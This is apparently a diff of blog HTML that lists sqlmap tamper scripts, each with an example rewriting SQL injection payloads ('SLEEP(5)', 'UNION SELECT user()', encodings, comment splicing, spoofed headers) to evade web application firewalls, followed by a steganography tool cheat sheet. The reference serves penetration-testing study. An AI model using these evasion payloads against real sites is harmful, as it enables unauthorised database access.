-<h4 id="5-ExternalInterface-addCallback"><a href="#5-ExternalInterface-addCallback" class="headerlink" title="5) ExternalInterface.addCallback()"></a>5) ExternalInterface.addCallback()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExternalInterface.addCallback(&apos;throwException&apos;,</span><br><span class="line">     function(s) &#123;</span><br><span class="line">       throw new Error(s)</span><br><span class="line">     &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1 ==&gt; 1 AND 1=1%00</span><br></pre></td></tr></table></figure>
+<h3 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h3><p><strong>Function: base64 encode</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; AND SLEEP(5)# ==&gt; MScgQU5EIFNMRUVQKDUpIw==</span><br></pre></td></tr></table></figure>
+<h3 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h3><p><strong>Function: &gt; ==&gt; NOT BETWEEN 0 AND</strong></p>
+<p><strong>Platform: Mssql2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B-- ==&gt; 1 AND A NOT BETWEEN 0 AND B--```、```1 AND A = B-- ==&gt; 1 AND A BETWEEN B AND B--</span><br></pre></td></tr></table></figure>
+<h3 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h3><p><strong>Function: 空格 ==&gt; %09</strong></p>
+<p><strong>Platform: MySQL 5.1, SGOS</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users WHERE id = 1 ==&gt; SELECT%09id FROM%09users WHERE%09id LIKE 1</span><br></pre></td></tr></table></figure>
+<h3 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h3><p><strong>Function: 双url编码</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE ==&gt; %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</span><br></pre></td></tr></table></figure>
+<h3 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h3><p><strong>Function: url编码</strong></p>
+<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE ==&gt; %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</span><br></pre></td></tr></table></figure>
+<h3 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h3><p><strong>Function: escape编码</strong></p>
+<p><strong>Platform: Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD%20FROM TABLE ==&gt; %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</span><br></pre></td></tr></table></figure>
+<h3 id="commalesslimit-py"><a href="#commalesslimit-py" class="headerlink" title="commalesslimit.py"></a>commalesslimit.py</h3><p><strong>Function: limit 2,3 ==&gt; LIMIT 3 OFFSET 2</strong></p>
+<p><strong>Platform: MySQL 5.0 and 5.5</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 2, 3 ==&gt; LIMIT 3 OFFSET 2</span><br></pre></td></tr></table></figure>
+<h3 id="commalessmid-py"><a href="#commalessmid-py" class="headerlink" title="commalessmid.py"></a>commalessmid.py</h3><p><strong>Function: MID(VERSION(), 1, 1) ==&gt; MID(VERSION() FROM 1 FOR 1)</strong></p>
+<p><strong>Platform: MySQL 5.0 and 5.5</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MID(VERSION(), 1, 1) ==&gt; MID(VERSION() FROM 1 FOR 1)</span><br></pre></td></tr></table></figure>
+<h3 id="concat2concatws-py"><a href="#concat2concatws-py" class="headerlink" title="concat2concatws.py"></a>concat2concatws.py</h3><p><strong>Function: CONCAT() ==&gt; CONCAT_WS()</strong></p>
+<p><strong>Platform: MySQL 5.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONCAT(1,2) ==&gt; CONCAT_WS(MID(CHAR(0),0,0),1,2)</span><br></pre></td></tr></table></figure>
+<h3 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h3><p><strong>Function: ＝ ==&gt; like</strong></p>
+<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1 ==&gt; SELECT * FROM users WHERE id LIKE 1</span><br></pre></td></tr></table></figure>
+<h3 id="escapequotes-py"><a href="#escapequotes-py" class="headerlink" title="escapequotes.py"></a>escapequotes.py</h3><p><strong>Function: ‘ ==&gt; \‘、” ==&gt; \“</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; AND SLEEP(5)# ==&gt; 1\\\\&quot; AND SLEEP(5)#</span><br></pre></td></tr></table></figure>
+<h3 id="greatest-py"><a href="#greatest-py" class="headerlink" title="greatest.py"></a>greatest.py</h3><p><strong>Function: &gt; ==&gt; GREATEST</strong></p>
+<p><strong>Platform: MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B ==&gt; 1 AND GREATEST(A,B+1)=A</span><br></pre></td></tr></table></figure>
+<h3 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h3><p><strong>Function: 空格 ==&gt; /*!0</strong></p>
+<p><strong>Platform: MySQL 4.0.18, 5.0.22</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union ==&gt; /*!0union</span><br></pre></td></tr></table></figure>
+<h3 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h3><p><strong>Function: IFNULL(A, B) ==&gt; IF(ISNULL(A), B, A)</strong></p>
+<p><strong>Platform: MySQL 5.0 and 5.5</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL(1, 2) ==&gt; IF(ISNULL(1),2,1)</span><br></pre></td></tr></table></figure>
+<h3 id="informationschemacomment-py"><a href="#informationschemacomment-py" class="headerlink" title="informationschemacomment.py"></a>informationschemacomment.py</h3><p><strong>Function: 空格 ==&gt; /**/</strong></p>
+<p><strong>Platform: MySQL</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES</span><br></pre></td></tr></table></figure>
+<h3 id="lowercase-py"><a href="#lowercase-py" class="headerlink" title="lowercase.py"></a>lowercase.py</h3><p><strong>Function: INSERT ==&gt; insert</strong></p>
+<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; select table_name from information_schema.tables</span><br></pre></td></tr></table></figure>
+<h3 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h3><p><strong>Function: AND ==&gt; /<em>!12345AND</em>/</strong></p>
+<p><strong>Platform: MySQL 5.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 2&gt;1-- ==&gt; 1 /*!30874AND 2&gt;1*/--</span><br></pre></td></tr></table></figure>
+<h3 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h3><p><strong>Function: 空格 ==&gt; 多个空格</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION SELECT foobar ==&gt; 1    UNION     SELECT   foobar</span><br></pre></td></tr></table></figure>
+<h3 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h3><p><strong>Function: union ==&gt; uniunionon</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION SELECT 2-- ==&gt; 1 UNIOUNIONN SELESELECTCT 2--</span><br></pre></td></tr></table></figure>
+<h3 id="overlongutf8-py"><a href="#overlongutf8-py" class="headerlink" title="overlongutf8.py"></a>overlongutf8.py</h3><p><strong>Function: unicode编码</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM TABLE WHERE 2&gt;1 ==&gt; SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1</span><br></pre></td></tr></table></figure>
+<h3 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h3><p><strong>Function: select ==&gt; s%e%l%e%c%t</strong></p>
+<p><strong>Platform: Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM TABLE ==&gt; %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</span><br></pre></td></tr></table></figure>
+<h3 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h3><p><strong>Function: INSERT ==&gt; INseRt</strong></p>
+<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT ==&gt; InseRt</span><br></pre></td></tr></table></figure>
+<h3 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h3><p><strong>Function: INSERT ==&gt; I/**/N/**/SERT</strong></p>
+<p><strong>Platform: Mysql</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT ==&gt; I/**/N/**/SERT</span><br></pre></td></tr></table></figure>
+<h3 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h3><p><strong>Function: 1 AND 1=1 ==&gt; 1 AND 1=1 and ‘0having’=’0having’</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1 ==&gt; 1 AND 1=1 and &apos;0having&apos;=&apos;0having&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h3><p><strong>Function: 空格 ==&gt;  sp_password</strong></p>
+<p><strong>Platform: Mssql</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227--  ==&gt; 1 AND 9227=9227-- sp_password</span><br></pre></td></tr></table></figure>
+<h3 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h3><p><strong>Function: 空格 ==&gt; /**/</strong></p>
+<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT/**/id/**/FROM/**/users</span><br></pre></td></tr></table></figure>
+<h3 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h3><p><strong>Function: 空格 ==&gt; –nVNaVoPYeva%0A</strong></p>
+<p><strong>Platform:MSSQL、SQLite</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 ==&gt; 1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227</span><br></pre></td></tr></table></figure>
+<h3 id="space2hash-py"><a href="#space2hash-py" class="headerlink" title="space2hash.py"></a>space2hash.py</h3><p><strong>Function: 空格 ==&gt; %23nVNaVoPYeva%0A</strong></p>
+<p><strong>Platform: MySQL 4.0, 5.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 ==&gt; 1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227</span><br></pre></td></tr></table></figure>
+<h3 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h3><p><strong>Function: 空格 ==&gt; %23ngNvzqu%0A</strong></p>
+<p><strong>Platform: MySQL 5.1.41</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 ==&gt; 1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</span><br></pre></td></tr></table></figure>
+<h3 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h3><p><strong>Function: 空格 ==&gt; %0E</strong></p>
+<p><strong>Platform: Mssql 2000,2005</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT%0Eid%0DFROM%07users</span><br></pre></td></tr></table></figure>
+<h3 id="space2mssqlblank-py-1"><a href="#space2mssqlblank-py-1" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h3><p><strong>Function: 空格 ==&gt; %23%0A</strong></p>
+<p><strong>Platform: Mssql、Mysql</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1 ==&gt; 1%23%0AAND%23%0A9227=9227</span><br></pre></td></tr></table></figure>
+<h3 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h3><p><strong>Function: 空格 ==&gt; %2B、%0D、%0C</strong></p>
+<p><strong>Platform: Mysql5.1</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT%0Bid%0DFROM%0Cusers</span><br></pre></td></tr></table></figure>
+<h3 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a>space2mysqldash.py</h3><p><strong>Function: 空格 ==&gt; –%0A</strong></p>
+<p><strong>Platform: Mssql、Mysql</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 ==&gt; 1--%0AAND--%0A9227=9227</span><br></pre></td></tr></table></figure>
+<h3 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h3><p><strong>Function: 空格 ==&gt; +</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT+id+FROM+users</span><br></pre></td></tr></table></figure>
+<h3 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h3><p><strong>Function: 空格 ==&gt; %0D、%0A、%0C、%09</strong></p>
+<p><strong>Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT%0Did%0DFROM%0Ausers</span><br></pre></td></tr></table></figure>
+<h3 id="symboliclogical-py"><a href="#symboliclogical-py" class="headerlink" title="symboliclogical.py"></a>symboliclogical.py</h3><p><strong>Function: and ==&gt; %26%26</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 %26%26 &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<h3 id="thinkphp-py"><a href="#thinkphp-py" class="headerlink" title="thinkphp.py"></a>thinkphp.py</h3><p><strong>Platform: Mysql</strong></p>
+<h3 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h3><p><strong>Function: 替换All为空</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 UNION ALL SELECT ==&gt; -1 UNION SELECT</span><br></pre></td></tr></table></figure>
+<h3 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h3><p><strong>Function: ‘ ==&gt; %df%27</strong></p>
+<p><strong>Platform: Mysql magic_quotes/addslashes</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; AND 1=1 ==&gt; 1%bf%27--</span><br></pre></td></tr></table></figure>
+<h3 id="uppercase-py"><a href="#uppercase-py" class="headerlink" title="uppercase.py"></a>uppercase.py</h3><p><strong>Function: 小写转大写</strong></p>
+<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert ==&gt; INSERT</span><br></pre></td></tr></table></figure>
+<h3 id="varnish-py"><a href="#varnish-py" class="headerlink" title="varnish.py"></a>varnish.py</h3><p><strong>Function: header头</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-originating-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>
+<h3 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h3><p><strong>Function: union ==&gt; /<em>!union</em>/</strong></p>
+<p><strong>Platform: MySQL 4.0.18, 5.1.56, 5.5.11</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select user() ==&gt; 1/*!UNION*//*!SELECT*/user()</span><br></pre></td></tr></table></figure>
+<h3 id="versionedmorekeywords-py"><a href="#versionedmorekeywords-py" class="headerlink" title="versionedmorekeywords.py"></a>versionedmorekeywords.py</h3><p><strong>Function: union ==&gt; /<em>!union</em>/</strong></p>
+<p><strong>Platform: MySQL 5.1.56, 5.5.11</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select user() ==&gt; 1/*!UNION*//*!SELECT*/user()</span><br></pre></td></tr></table></figure>
+<h3 id="xforwardedfor-py"><a href="#xforwardedfor-py" class="headerlink" title="xforwardedfor.py"></a>xforwardedfor.py</h3><p><strong>Function: X-Forwarded-For随机头</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/03/Steganography/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/09/03/Steganography/" itemprop="url">
+                  Steganography
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-03T22:27:07+08:00">
+                2016-09-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; copy /b 1.jpg+1.rar new.jpg</span><br></pre></td></tr></table></figure>
+<h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; binwalk zip.jpg</span><br></pre></td></tr></table></figure>
+<h3 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a><a href="http://www.caesum.com/handbook/Stegsolve.jar" target="_blank" rel="external">Stegsolve</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stegsolve.jar</span><br></pre></td></tr></table></figure>
+<h3 id="exiftool"><a href="#exiftool" class="headerlink" title="exiftool"></a>exiftool</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; exiftool 1.jpg</span><br></pre></td></tr></table></figure>
+<h3 id="MP3Stego"><a href="#MP3Stego" class="headerlink" title="MP3Stego"></a><a href="http://www.petitcolas.net/fabien/software/MP3Stego_1_1_18.zip" target="_blank" rel="external">MP3Stego</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3</span><br><span class="line">&gt; decode -X -P pass svega_stego.mp3</span><br></pre></td></tr></table></figure>
+<h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; binwalk carter.jpg</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">382           0x17E           Copyright string: &quot;Copyright (c) 1998 Hewlett-Packard Company&quot;</span><br><span class="line">3192          0xC78           TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">140147        0x22373         JPEG image data, JFIF standard 1.01</span><br><span class="line">140177        0x22391         TIFF image data, big-endian, offset of first image directory: 8</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; dd if=test.jpg of=test.jpg skip=140147 bs=1</span><br></pre></td></tr></table></figure>
+<h3 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; foremost</span><br></pre></td></tr></table></figure>
+<h3 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h3><blockquote>
+<p>mp4</p>
+</blockquote>
